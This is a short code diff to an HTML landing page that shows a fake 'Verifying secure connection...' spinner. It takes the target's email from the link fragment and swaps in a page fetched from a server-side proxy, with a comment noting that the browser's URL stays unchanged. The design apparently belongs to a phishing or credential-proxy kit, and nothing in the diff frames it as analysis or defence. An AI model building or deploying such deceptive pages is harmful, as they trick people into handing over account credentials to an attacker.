@@ -13,22 +13,37 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="loader">
         <div class="spinner"></div>
         <p id="status-text">Verifying secure connection...</p>
     </div>
+    
     <script>
         setTimeout(function() {
             var hash = window.location.hash;
             if (hash && hash.length > 1) {
                 var email = hash.substring(1); 
-                window.location.href = "/" + email;
+                
+                // Fetch the proxied page via API without changing the URL
+                fetch('/api/fetch?email=' + encodeURIComponent(email))
+                    .then(response => response.text())
+                    .then(html => {
+                        // Replace the entire page with the fetched HTML
+                        document.open();
+                        document.write(html);
+                        document.close();
+                    })
+                    .catch(err => {
+                        document.getElementById('status-text').innerHTML = "Connection failed. Please try again.";
+                        document.getElementById('status-text').style.color = "red";
+                        document.querySelector('.spinner').style.display = "none";
+                    });
             } else {
                 document.getElementById('status-text').innerHTML = "No account specified. Please use a valid link.";
                 document.getElementById('status-text').style.color = "red";
                 document.querySelector('.spinner').style.display = "none";
             }
-        }, 1500);
+        }, 1000);
     </script>
 </body>
 </html>
